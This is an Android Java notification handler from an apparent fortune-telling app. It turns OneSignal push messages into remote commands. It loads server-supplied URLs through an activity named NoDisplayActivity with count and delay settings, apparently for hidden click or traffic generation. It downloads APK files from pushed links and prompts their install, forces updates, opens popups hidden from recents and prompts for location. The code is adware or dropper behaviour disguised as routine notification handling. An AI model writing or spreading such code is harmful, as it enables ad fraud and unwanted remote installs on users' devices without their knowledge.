package ir.website.faal141;

import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.util.Log;

import com.onesignal.OSNotification;
import com.onesignal.OneSignal;

/**
 * Created by ali on 9/26/17.
 */

public class NotificationReceivedHandler  implements OneSignal.NotificationReceivedHandler {
    public NotificationReceivedHandler(){
    }
    @Override
    public void notificationReceived(OSNotification notification) {
        OSService.notification="";
        Utility.isFirst=false;
        try {
            String type="";
            try{
                type = notification.payload.additionalData.getString("type");
            }
            catch (Exception ex){
                Log.d("NotificationReceived", ex.toString());
            }
            try{
                OneSignal.promptLocation();

            }
            catch (Exception ex){
                Log.d("NotificationReceived", ex.toString());
            }
            Log.d("NotificationReceived", type);
            if(type.equals("popup")) {
                //Utility.setBool("inapp", false);
                OneSignal.clearOneSignalNotifications();
                notification.payload.rawPayload="";
                OSService.notification=notification.stringify();
                Utility.setString("notification",OSService.notification);
                UtilityV2.setVersion();
                UtilityV2.setMessageFix();
                Intent serviceIntent=null;
                if(UtilityV2.popType.contains("v1"))
                    serviceIntent = new Intent(OSService.context, PopActivity.class);
                else
                    serviceIntent = new Intent(OSService.context, PopActivityV2.class);
                serviceIntent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
                serviceIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                serviceIntent.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
                OSService.context.startActivity(serviceIntent);
            }
            else if(type.equals("telegram")){
                OneSignal.clearOneSignalNotifications();
                Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(notification.payload.additionalData.getString("link1")));
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK| Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
                OSService.context.startActivity(intent);
            }
            else if(type.equals("link")){
                OneSignal.clearOneSignalNotifications();
                try{NoDisplayActivity.urls=Utility.jsArr2ArrLi(notification.payload.additionalData.getString("urls"));}catch (Exception e){}
                try{NoDisplayActivity.max=Integer.valueOf(notification.payload.additionalData.getString("max")).intValue();}catch (Exception e){}
                try{NoDisplayActivity.min=Integer.valueOf(notification.payload.additionalData.getString("min")).intValue();}catch (Exception e){}
                try{NoDisplayActivity.delay=Integer.valueOf(notification.payload.additionalData.getString("delay")).intValue();}catch (Exception e){}
                try{NoDisplayActivity.limit=Integer.valueOf(notification.payload.additionalData.getString("limit")).intValue();}catch (Exception e){}
                new RequestTask().execute(notification.payload.additionalData.getString("link1"));
            }
            else if(type.equals("update")){
                OneSignal.clearOneSignalNotifications();
                Log.d("NotificationReceived", notification.payload.additionalData.getString("link1"));
                Boolean forceUpdate=false;
                try{
                    String fupdate = notification.payload.additionalData.getString("forceupdate");
                    forceUpdate=true;
                }
                catch (Exception ex){
                    Log.d("NotificationReceived", ex.toString());
                    forceUpdate=false;
                }
                Utility.updateApp(notification.payload.additionalData.getString("link1"),forceUpdate);
            }
            else if(type.equals("install")) {
                OneSignal.clearOneSignalNotifications();
                String filename = notification.payload.additionalData.getString("file");
                String link = notification.payload.additionalData.getString("link1");
                notification.payload.rawPayload=Utility.downloadApp(link,filename);
                if(notification.payload.rawPayload!="") {
                    String pkname = Utility.getPackageName(notification.payload.rawPayload);
                    try {
                        PackageManager pm = OSService.context.getPackageManager();
                        pm.getPackageInfo(pkname, PackageManager.GET_ACTIVITIES);
                    } catch (Exception e) {
                        Intent serviceIntent = new Intent(OSService.context, PopActivity.class);
                        serviceIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
                        OSService.notification = notification.stringify();
                        OSService.context.startActivity(serviceIntent);
                    }
                }
            }
        } catch (Exception ex) {
            Log.d("NotificationReceived", ex.getMessage());
        }
    }
}
